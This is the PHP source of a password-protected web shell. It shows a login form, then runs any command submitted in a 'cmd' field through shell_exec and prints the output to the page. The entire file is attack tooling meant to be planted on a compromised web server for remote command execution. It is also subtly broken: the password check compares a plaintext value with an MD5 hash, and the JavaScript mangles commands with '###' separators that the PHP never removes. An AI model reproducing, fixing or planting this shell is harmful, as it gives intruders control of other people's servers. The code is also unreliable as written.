<?
@session_start();


$password = "mazino";
$input_password = $_POST["password"];
$test = "mazino";
$page = $_SERVER["PHP_SELF"];
$cmd = $_POST["cmd"];

if(empty($_SESSION["webshell_id"]) && empty($input_password)){

?>
<form action="<?=$page?>" method="POST">

<input type ="password" name="password">
<input type="submit" value="AUTH">
</form>

<?
exit();

}else if(empty($_SESSION["webshell_id"]) && !empty($input_password)){
if($password == md5($input_password)){
$_SESSION["webshell_id"]="mazino";
echo "<script>location.reload()</script>";
exit();
}else{
    echo "<script>location.href='{$page}'</script>";
exit();
}
}

if(!empty($cmd)){
    $result = shell_exec($cmd);
    $result = str_replace("\n","<br>",$result);
}


?>

<script>
document.addEventListener("keydown",(event)=>{if(event.keyCode===13){cmdRequest()}});
function cmdRequest(params) {
    var frm = document.frm;
    var cmd = frm.cmd.value;
    var enc_cmd = "";

    for(i=0; i<cmd.length; i++){
        enc_cmd += cmd.charAt(i)+"###";

    }
    frm.cmd.value=enc_cmd;
    frm.action = "<?=$page?>";
    frm.submit();
}
</script>

<form action="<?=$page?>" method="POST">
<input type="text" name="cmd">
<input type="submit" value="EXECUTE">
</form>
<hr>
<? if (!empty($cmd))  {?>
<table style="boarder: 1px solid black; background-color:black">
<tr>
<td style="color:white; font-size:12px">
<?=$result?>
</td>
</tr>
</table>
<?}?>